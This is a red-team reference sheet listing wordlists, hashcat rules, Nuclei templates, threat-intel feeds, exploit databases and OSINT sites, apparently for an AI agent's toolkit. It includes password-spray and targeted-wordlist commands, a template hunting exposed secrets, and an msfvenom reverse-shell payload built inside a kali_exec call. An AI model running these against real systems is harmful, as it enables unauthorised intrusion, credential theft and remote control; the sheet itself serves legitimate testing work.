# WORDLISTS & RESOURCES REFERENCE
# April 2026 Red Team Stack
# Every wordlist, feed, and reference you need — with install commands

---

## WORDLIST INSTALLATION

```bash
# On Kali (pre-installed, but check):
ls /usr/share/wordlists/
ls /usr/share/seclists/

# Install SecLists (most important):
sudo apt install seclists
# OR:
git clone https://github.com/danielmiessler/SecLists.git /usr/share/seclists

# Install rockyou (should be on Kali already):
ls /usr/share/wordlists/rockyou.txt.gz
gunzip /usr/share/wordlists/rockyou.txt.gz

# Install via HexStrike:
# docker exec hexstrike bash -c "apt install seclists wordlists -y"
```

---

## PASSWORD WORDLISTS

```
WORDLIST                          SIZE     BEST FOR
────────────────────────────────────────────────────────────────────────
/usr/share/wordlists/rockyou.txt  133MB    General password cracking
seclists/Passwords/rockyou-75.txt 53MB     Smaller rockyou subset
seclists/Passwords/xato-net-10-million-passwords-10000.txt  10k  Web login brute
seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt  10  Quick spray
seclists/Passwords/Leaked-Databases/  Multiple  Real-world leaked passwords
kaonashi.txt (external)           69GB     ULTRA wordlist — download separately
hashesorg2019 (external)          6.3B     Massive cracking list
```

**Curated corporate password patterns (for spray):**
```
seclists/Passwords/Leaked-Databases/rockyou-75.txt
```

**Generate target-specific wordlist:**
```bash
# CeWL spider
cewl https://[TARGET] -d 3 -m 6 -w /tmp/cewl.txt --with-numbers

# CUPP (Common User Passwords Profiler)
pip install cupp
cupp -i  # Interactive mode — enter target personal info
         # Name, DOB, company, pet, etc.
         # Output: highly targeted wordlist

# PrinceProcessor (combination)
pp.bin /usr/share/wordlists/rockyou.txt > /tmp/prince.txt
```

---

## DIRECTORY / URL WORDLISTS

```
WORDLIST                                              SIZE    BEST FOR
────────────────────────────────────────────────────────────────────────────
seclists/Discovery/Web-Content/raft-large-directories.txt  62k  Comprehensive dir brute
seclists/Discovery/Web-Content/raft-medium-directories.txt  29k  Balanced speed/coverage
seclists/Discovery/Web-Content/directory-list-2.3-big.txt  1.2M  Very thorough
seclists/Discovery/Web-Content/common.txt             4.5k  Fast common paths
seclists/Discovery/Web-Content/raft-large-files.txt   37k   File discovery
seclists/Discovery/Web-Content/burp-parameter-names.txt  6.7k  Parameter fuzzing
seclists/Discovery/Web-Content/api/api-endpoints.txt  ~50k  API discovery
seclists/Discovery/Web-Content/swagger.txt            ~5k   Swagger/API doc paths
seclists/Fuzzing/LFI/LFI-Jhaddix.txt                 929   LFI payloads
seclists/Fuzzing/SQLi/                                Multiple  SQL injection
seclists/Fuzzing/XSS/                                Multiple  XSS payloads
seclists/Fuzzing/SSRF/                                Multiple  SSRF payloads
```

---

## SUBDOMAIN / DNS WORDLISTS

```
seclists/Discovery/DNS/subdomains-top1million-5000.txt     5k   Fast recon
seclists/Discovery/DNS/subdomains-top1million-20000.txt    20k  Balanced
seclists/Discovery/DNS/subdomains-top1million-110000.txt   110k Thorough
seclists/Discovery/DNS/n0kovo_subdomains.txt               ~3M  Massive
seclists/Discovery/DNS/bitquark-subdomains-top100000.txt   100k Good coverage
```

---

## USERNAME WORDLISTS

```
seclists/Usernames/Names/names.txt                    10k   General names
seclists/Usernames/Names/familynames-usa-top300.txt   300   US surnames
seclists/Usernames/cirt-default-usernames.txt         850   Default usernames
seclists/Usernames/top-usernames-shortlist.txt        14    Most common
seclists/Miscellaneous/wordlist-skipfish.fuzz.txt     2.4k  Skipfish list
```

---

## HASHCAT RULES

```
/usr/share/hashcat/rules/
├── best64.rule       64 rules — best speed/effectiveness balance
├── d3ad0ne.rule      34k rules — comprehensive
├── dive.rule         2M rules — maximum coverage
├── InsidePro-PasswordsPro.rule  3.4k rules
├── Incisive-leetspeak.rule      ~100  Leetspeak transforms
├── rockyou-30000.rule           30k   rockyou-based rules
├── T0XlCv2.rule                 ~100  Targeted rules
└── toggles5.rule                2k    Case toggling
```

**Best combinations:**
```bash
# Speed-focused (10min budget):
-r /usr/share/hashcat/rules/best64.rule

# Thorough (1hr budget):
-r /usr/share/hashcat/rules/d3ad0ne.rule

# Maximum (8hr+ budget):
-r /usr/share/hashcat/rules/dive.rule

# Corporate passwords (best for enterprise):
-r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/Incisive-leetspeak.rule
```

---

## NUCLEI TEMPLATES

```bash
# Update Nuclei templates (4000+):
nuclei -update-templates

# Template locations:
~/.local/nuclei-templates/
├── cves/              4000+ CVE templates
├── exposures/         Exposed files, configs, panels
├── misconfiguration/  Cloud, network misconfigs
├── technologies/      Technology detection
├── vulnerabilities/   Web vulnerabilities
├── network/           Network-level checks
├── ssl/               TLS/SSL issues
└── fuzzing/           Fuzzing templates

# Custom template example:
cat > /tmp/custom_template.yaml << 'EOF'
id: custom-api-exposure

info:
  name: Custom API Key Exposure
  severity: high

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/config"
      - "{{BaseURL}}/.env"
    matchers:
      - type: regex
        regex:
          - "API_KEY=[A-Za-z0-9]{32,}"
          - "SECRET=[A-Za-z0-9]{32,}"
EOF
nuclei -t /tmp/custom_template.yaml -u https://target.com
```

---

## THREAT INTELLIGENCE FEEDS

```bash
# Free feeds — check daily in AutoGPT monitoring task:

# CISA KEV (Known Exploited Vulnerabilities)
curl -s https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json | python3 -c "import sys,json; [print(v['cveID'], v['vendorProject'], v['vulnerabilityName']) for v in json.load(sys.stdin)['vulnerabilities'][:10]]"

# AlienVault OTX (free API key)
curl -s -H "X-OTX-API-KEY: [YOUR_KEY]" "https://otx.alienvault.com/api/v1/indicators/export?limit=100&type=IPv4"

# Abuse.ch (no key needed)
curl -s https://feodotracker.abuse.ch/downloads/ipblocklist_recommended.txt | grep -v '#' | head -20

# URLhaus
curl -s https://urlhaus.abuse.ch/downloads/text_recent/ | head -20

# MalwareBazaar
curl -s -d 'query=get_recent&selector=100' https://mb-api.abuse.ch/api/v1/

# Shodan CVE feed
curl -s "https://cvedb.shodan.io/cve/CVE-2024-3400"
```

---

## EXPLOIT DATABASES

```bash
# SearchSploit (local ExploitDB mirror)
searchsploit [service] [version]
searchsploit -m [EDB_ID]    # Download exploit
searchsploit -x [EDB_ID]    # Examine in place

# Online:
# https://www.exploit-db.com/search?q=[QUERY]
# https://vulners.com
# https://packetstormsecurity.com

# CVE feeds:
# https://nvd.nist.gov/feeds
# https://cve.mitre.org
# https://cvetrends.com (trending CVEs)

# PoC GitHub search:
# https://github.com/search?q=CVE-[YEAR]-[NUMBER]+poc

# Nuclei CVE templates:
# https://github.com/projectdiscovery/nuclei-templates/tree/main/cves
```

---

## OSINT RESOURCES

```
RESOURCE                URL                           NOTES
──────────────────────────────────────────────────────────────────────
Shodan                  shodan.io                     Exposed services (API key needed)
Censys                  search.censys.io              Deep internet scan
SecurityTrails          securitytrails.com            DNS history, subdomains
crt.sh                  crt.sh/?q=%25.[domain]        Certificate transparency
BuiltWith               builtwith.com                 Technology stack
WiGLE                   wigle.net                     WiFi network database
HaveIBeenPwned          haveibeenpwned.com/API        Breach data (free API)
Hunter.io               hunter.io                     Email format discovery
LinkedIn                linkedin.com/search           Employee enumeration
GitHub                  github.com/search             Code/secret search
GreyNoise               greynoise.io                  Background noise vs targeted
Spyse (Netlas)          netlas.io                     Internet asset discovery
```

---

## PAYLOAD REFERENCES

```bash
# PayloadsAllTheThings — most comprehensive
git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git /opt/PayloadsAllTheThings

# Navigating:
ls /opt/PayloadsAllTheThings/
# SQL Injection/         XXE Injection/       SSRF injection/
# File Inclusion/        Command Injection/   Path Traversal/
# JWT Attacks/           OAuth Misconfiguration/

# Reverse shell generator
# https://www.revshells.com (web UI)
# Or:
kali_exec("msfvenom -p linux/x64/shell_reverse_tcp LHOST=[IP] LPORT=4444 -f elf -o /tmp/shell.elf")
```

---

*April 2026 | Keep wordlists updated — SecLists is updated weekly*
